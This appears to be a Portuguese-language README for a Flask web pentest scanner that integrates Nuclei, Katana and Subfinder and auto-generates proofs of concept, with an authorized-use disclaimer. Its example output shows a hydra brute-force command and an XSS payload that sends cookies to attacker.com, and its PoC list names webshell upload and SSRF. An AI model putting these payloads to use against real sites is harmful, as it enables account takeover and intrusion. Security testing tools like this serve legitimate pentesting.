<div align="center">

<!-- Animated Header -->
<img src="https://readme-typing-svg.demolab.com?font=Share+Tech+Mono&size=32&duration=2000&pause=500&color=00D4FF&center=true&vCenter=true&multiline=true&width=800&height=100&lines=%E2%97%86+SOC+SCANNER+PRO+v5.0;Advanced+Pentest+%7C+JWT+%7C+Supabase+%7C+OWASP+Top+10" alt="SOC Scanner PRO" />

<br/>

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Flask](https://img.shields.io/badge/Flask-2.3%2B-000000?style=for-the-badge&logo=flask&logoColor=white)](https://flask.palletsprojects.com)
[![Nuclei](https://img.shields.io/badge/Nuclei-Integrado-00D4FF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0xMiAyTDIgN2wxMCA1IDEwLTV6Ii8+PC9zdmc+)](https://nuclei.projectdiscovery.io)
[![OWASP](https://img.shields.io/badge/OWASP-Top%2010-FF3355?style=for-the-badge)](https://owasp.org)
[![License](https://img.shields.io/badge/Licença-MIT-00FF88?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/Charyflux/67SCANNER?style=for-the-badge&color=ffcc00)](https://github.com/Charyflux/67SCANNER/stargazers)

<br/>

> **🛡️ Scanner de segurança avançado com interface web em tempo real.**  
> Detecta vulnerabilidades OWASP Top 10, CVEs, JWT expostos, credenciais Supabase, e gera Provas de Conceito (PoC) reais automaticamente.

<br/>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

</div>

<br/>

## 📋 Índice

- [🎯 O que é o SOC Scanner PRO?](#-o-que-é-o-soc-scanner-pro)
- [⚡ Funcionalidades](#-funcionalidades)
- [🔍 Módulos de Scan](#-módulos-de-scan)
- [📦 Instalação](#-instalação)
- [🚀 Como Usar](#-como-usar)
- [🖥️ Interface Web](#️-interface-web)
- [🎯 Exemplos de Output](#-exemplos-de-output)
- [⚠️ Aviso Legal](#️-aviso-legal)
- [🤝 Contribuir](#-contribuir)

<br/>

---

## 🎯 O que é o SOC Scanner PRO?

O **SOC Scanner PRO v5.0** é uma ferramenta de pentest web completa, desenvolvida em Python, que combina múltiplos scanners e técnicas num único painel web interativo com **terminal ao vivo** em tempo real via WebSocket.

Ideal para:
- 🔴 **Bug Bounty** — encontra vulnerabilidades em alvos autorizados rapidamente
- 🟠 **Pentests Web** — relatório completo com PoCs reais para o cliente
- 🟡 **Auditoria de Segurança** — verifica a postura de segurança de aplicações próprias
- 🔵 **CTF / Aprendizagem** — aprende pentest com resultados reais e explicados

<br/>

---

## ⚡ Funcionalidades

```
┌─────────────────────────────────────────────────────────────────┐
│                    SOC SCANNER PRO v5.0                         │
│─────────────────────────────────────────────────────────────────│
│  ✔ 16 módulos de scan automáticos                               │
│  ✔ 13 Provas de Conceito (PoC) reais executadas automaticamente │
│  ✔ Nuclei CVE scanner integrado (3000+ templates)              │
│  ✔ Katana web crawler com análise de parâmetros                 │
│  ✔ Descoberta de subdominios (Subfinder / bruteforce)           │
│  ✔ Scanner JWT + Supabase dedicado                              │
│  ✔ Score de segurança 0–100 com nota A–F                        │
│  ✔ Terminal ao vivo via WebSocket (sem refresh de página)       │
│  ✔ Interface web dark-mode responsiva                           │
└─────────────────────────────────────────────────────────────────┘
```

<br/>

---

## 🔍 Módulos de Scan

### 🌐 Reconhecimento
| Módulo | O que faz |
|--------|-----------|
| 🔎 **DNS/WHOIS** | Registos A, AAAA, MX, NS, TXT · DNSSEC · SPF · DMARC · Zone Transfer · Expiração de domínio |
| 🌍 **Subdominios** | Descoberta via Subfinder ou bruteforce com lista de 24 subdomínios comuns · Verifica quais estão online |
| 🕸️ **Katana Crawl** | Crawler completo com análise de parâmetros interessantes (SQLi, XSS, SSRF, etc.) |

### 🔒 Segurança de Infraestrutura
| Módulo | O que faz |
|--------|-----------|
| 🔌 **Portas** | Scan das 30 portas mais comuns · Alerta portas perigosas (MySQL, Redis, MongoDB, RDP...) |
| 🔐 **TLS/SSL** | Protocolo · Cifra · Dias até expiração · Redirect HTTP→HTTPS |
| 🛡️ **Security Headers** | CSP · HSTS · X-Frame-Options · CORS · Referrer-Policy · Permissions-Policy |
| 🤖 **Bloqueio Scanners** | Testa se o site bloqueia User-Agents de 10 scanners (sqlmap, nikto, burp, nuclei...) |
| ⚡ **Rate Limiting** | Verifica se endpoints /login /auth têm rate limit activo |
| 🧱 **WAF Detection** | Detecção de Cloudflare, Akamai, Imperva, ModSecurity e mais |

### 💉 Testes de Vulnerabilidade
| Módulo | O que faz |
|--------|-----------|
| 💀 **Nuclei CVE** | Executa ~3000 templates · Detecta CVEs, misconfigs, default-logins, SQLi, XSS, SSRF, LFI, RCE |
| 🔑 **JWT / Supabase** | Caça JWTs expostos em HTML/JS · Extrai URLs e keys Supabase · Testa `alg:none` · Proba API Supabase |
| 📁 **Paths Sensíveis** | Verifica /.env · /.git/config · /admin/ · /phpmyadmin/ · /actuator/ · swagger.json e mais 30 paths |
| 🌐 **CORS** | Testa 4 origens maliciosas · Detecção de wildcard e reflexo de credenciais |
| 🔀 **HTTP Methods** | Verifica PUT · DELETE · TRACE · CONNECT expostos |
| 🕵️ **Fingerprinting** | Stack tecnológica · .git/.env expostos · Clickjacking · security.txt |

### 🎭 Provas de Conceito (PoC) Automáticas
> **13 PoCs executados automaticamente** com curl commands, JavaScript de exploração e impacto real:

| # | PoC | Impacto |
|---|-----|---------|
| 1 | 🖱️ **Clickjacking** | iframe sobre a página + botões invisíveis |
| 2 | 🌍 **CORS Arbitrário** | Roubo de dados autenticados cross-origin |
| 3 | ↗️ **Open Redirect** | Phishing — redireciona vítima para site malicioso |
| 4 | 💉 **XSS Reflectido** | Roubo de cookies e sessões |
| 5 | 🗄️ **SQL Injection** | Error-based + Time-based blind SQLi |
| 6 | ⚡ **HTTP Methods** | Upload de webshell via PUT / XST via TRACE |
| 7 | 🕵️ **Info Leakage** | Stack tecnológica exposta via headers HTTP |
| 8 | 📄 **Ficheiros Sensíveis** | .env / .git / phpinfo / wp-config com conteúdo real |
| 9 | 🔓 **TLS Downgrade** | Servidor aceita TLSv1.0/1.1 (POODLE/BEAST) |
| 10 | 🔑 **Brute Force** | Sem rate limit → ataque de dicionário ilimitado |
| 11 | 🌐 **DNS Zone Transfer** | Exposição de toda a infraestrutura DNS |
| 12 | ☁️ **SSRF** | Acesso a metadados AWS/GCP |
| 13 | 🏳️ **Subdomain Takeover** | Reclamar subdomínio abandonado |

<br/>

---

## 📦 Instalação

### ✅ Pré-requisitos
- Python 3.8 ou superior
- pip3
- Go 1.18+ *(opcional — para Nuclei, Katana, Subfinder)*
- Linux / macOS / Windows (WSL2 recomendado)

---

### 🚀 Instalação Rápida (Linux/macOS)

```bash
# 1. Clonar o repositório
git clone https://github.com/Charyflux/67SCANNER.git
cd 67SCANNER

# 2. Dar permissão ao script de instalação
chmod +x install.sh

# 3. Executar instalação automática
./install.sh
```

O script instala automaticamente:
- ✔ Todas as dependências Python
- ✔ Go (se não estiver instalado)
- ✔ Nuclei + templates actualizados
- ✔ Katana (web crawler)
- ✔ Subfinder (subdomain discovery)

---

### 🐍 Instalação Manual (apenas Python)

```bash
# Clonar
git clone https://github.com/Charyflux/67SCANNER.git
cd 67SCANNER

# Instalar dependências
pip3 install -r requirements.txt

# Iniciar
python3 soc.py
```

> ⚠️ Sem Go/Nuclei/Katana o scanner funciona na versão básica (sem CVE scan e sem crawler avançado).

---

### 🐋 Dependências Python

```
flask>=2.3.0          # Servidor web
flask-socketio>=5.3.0 # WebSocket tempo real
requests>=2.31.0      # HTTP requests
dnspython>=2.4.0      # Queries DNS
python-whois>=0.8.0   # Informações WHOIS
eventlet>=0.33.0      # Async I/O para SocketIO
```

---

### 🔧 Ferramentas Go (Opcionais mas Recomendadas)

```bash
# Nuclei — CVE scanner com 3000+ templates
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Katana — Web crawler avançado
go install github.com/projectdiscovery/katana/cmd/katana@latest

# Subfinder — Descoberta de subdominios
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Actualizar templates Nuclei
nuclei -update-templates
```

<br/>

---

## 🚀 Como Usar

### 1️⃣ Iniciar o Servidor

```bash
python3 soc.py
```

Output esperado:
```
====================================================
  SOC SCANNER PRO v5.0 + PoC COMPLETO
  16 módulos + 13 PoCs reais + Nuclei + Katana
  Local: http://localhost:7331
  Rede:  http://SEU_IP:7331
====================================================
```

---

### 2️⃣ Abrir a Interface Web

Abre o browser e acede a:
```
http://localhost:7331
```

---

### 3️⃣ Executar um Scan

1. **Cole o alvo** no campo de input:
   ```
   https://exemplo.com
   dominio.pt
   192.168.1.1
   ```

2. **Clique em** `SCAN COMPLETO + PoC`

3. **Acompanha em tempo real** no terminal ao vivo (lado direito)

4. **Explora os resultados** nas abas:

| Aba | Conteúdo |
|-----|----------|
| 📊 **Resultados** | Visão geral · Score · Todos os painéis |
| 🧪 **Provas de Conceito** | 13 PoCs com curl/JS e impacto real |
| 🐛 **Nuclei CVEs** | Lista ordenada por severidade |
| 🕸️ **Katana** | URLs crawladas + parâmetros interessantes |
| 🌍 **Subdominios** | Subdominios descobertos e online |
| 🔑 **JWT / Supabase** | Tokens expostos, keys, tabelas acessíveis |

---

### 4️⃣ Interpretar o Score

```
A (85–100) 🟢  Excelente  — pouquíssimas vulnerabilidades
B (70–84)  🟡  Bom        — algumas melhorias necessárias
C (55–69)  🟠  Razoável   — vulnerabilidades médias presentes
D (40–54)  🔴  Fraco      — vulnerabilidades sérias
F (0–39)   ⛔  CRÍTICO    — comprometimento iminente
```

<br/>

---

## 🖥️ Interface Web

```
┌─────────────────────────────────────────────────────────────────────┐
│  ◆ SOC SCANNER PRO                                                  │
│  Advanced Pentest · Nuclei · Katana · CVE · PoC Real · OWASP Top 10│
│─────────────────────────────────────────────────────────────────────│
│  ● Ligado — pronto!                                                 │
│                                                                     │
│  ▶ ALVO                                                             │
│  [ https://exemplo.com                          ] [ SCAN + PoC ]   │
│─────────────────────────────────────────────────────────────────────│
│  📊 Resultados | 🧪 PoCs | 🐛 Nuclei | 🕸️ Katana | 🌍 Subs | 🔑 JWT │
│─────────────────────────────────────────────────────────────────────│
│  ┌─────────────────────────────┐  ┌─────────────────────────────┐  │
│  │   Score: 42/100   Nota: D   │  │  ■ TERMINAL AO VIVO         │  │
│  │   ○ ring chart              │  │  > A verificar DNS...        │  │
│  │─────────────────────────────│  │  ✔ SPF: ok                  │  │
│  │  🛡️ Security Headers  3 aus │  │  ✗ DMARC: AUSENTE!          │  │
│  │  🔐 TLS/SSL          TLSv1.3│  │  > Portas: 22,80,443        │  │
│  │  🔌 Portas           5 aber │  │  ✗ MySQL 3306 PERIGO!       │  │
│  │  📁 Paths Sensíveis  2 exp  │  │  > Nuclei a correr...        │  │
│  └─────────────────────────────┘  └─────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

<br/>

---

## 🎯 Exemplos de Output

### 🔑 JWT / Supabase Encontrado
```
[CRIT] Supabase URL: https://xyzabc123def456.supabase.co
[CRIT] Supabase KEY! role=service_role
[CRIT] Supabase /users exposto! 847 rows
[CRIT] auth/admin/users acessivel — lista de TODOS os utilizadores exposta!
```

### 💀 Nuclei CVE Detectado
```
[CRITICAL] CVE-2023-44487 | HTTP/2 Rapid Reset Attack
[HIGH]     CVE-2022-22965 | Spring4Shell RCE
[MEDIUM]   Admin Panel Exposto | /admin/
```

### 🎭 PoC Confirmado
```
[CRIT] Sem rate limit em /login — 30 pedidos aceites
  → hydra -l admin -P rockyou.txt target http-post-form "/login:..."
[HIGH] XSS Reflectido em ?q=
  → <script>document.location='https://attacker.com?c='+document.cookie</script>
```

<br/>

---

## ⚠️ Aviso Legal

```
╔═══════════════════════════════════════════════════════════════╗
║                        AVISO LEGAL                            ║
║───────────────────────────────────────────────────────────────║
║  Esta ferramenta destina-se EXCLUSIVAMENTE a:                 ║
║  • Sistemas próprios que você possui ou administra            ║
║  • Sistemas com autorização ESCRITA do proprietário           ║
║  • Ambientes de laboratório e CTF                             ║
║  • Pentests com contrato/escopo definido                      ║
║                                                               ║
║  O uso não autorizado em sistemas de terceiros é ILEGAL       ║
║  e pode resultar em processo criminal.                        ║
║                                                               ║
║  O autor não se responsabiliza por uso indevido.              ║
╚═══════════════════════════════════════════════════════════════╝
```

<br/>

---

## 🗂️ Estrutura do Projeto

```
67SCANNER/
├── 📄 soc.py          # Aplicação principal (servidor Flask + scanner)
├── 📋 requirements.txt # Dependências Python
├── 🔧 install.sh      # Script de instalação automática
├── 🚫 .gitignore      # Ficheiros ignorados pelo Git
└── 📖 README.md       # Esta documentação
```

<br/>

---

## 🤝 Contribuir

Contribuições são bem-vindas! Para contribuir:

```bash
# 1. Fork o repositório
# 2. Cria uma branch para a feature
git checkout -b feature/nova-funcionalidade

# 3. Faz as alterações e commit
git commit -m "feat: adicionar novo módulo de scan"

# 4. Push e abre Pull Request
git push origin feature/nova-funcionalidade
```

**Ideias para contribuições:**
- 🆕 Novos módulos de scan
- 🐛 Correções de bugs
- 📖 Melhorias na documentação
- 🌍 Tradução para outros idiomas
- 🎨 Melhorias na UI

<br/>

---

## 📊 Roadmap

- [x] 16 módulos de scan
- [x] 13 PoCs automáticos
- [x] Nuclei CVE integrado
- [x] JWT / Supabase scanner
- [x] Score 0–100
- [ ] Exportar relatório PDF
- [ ] Scan de múltiplos alvos em paralelo
- [ ] Integração com Shodan API
- [ ] Modo API REST (headless)
- [ ] Docker image

<br/>

---

<div align="center">

<img src="https://readme-typing-svg.demolab.com?font=Share+Tech+Mono&size=14&duration=3000&pause=1000&color=3A6080&center=true&vCenter=true&width=600&lines=Use+apenas+em+sistemas+com+autorização.;Pentest+responsável+é+pentest+legal." alt="Aviso" />

<br/>

**Feito com ❤️ para a comunidade de segurança**

[![GitHub](https://img.shields.io/badge/GitHub-Charyflux-181717?style=for-the-badge&logo=github)](https://github.com/Charyflux)

</div>
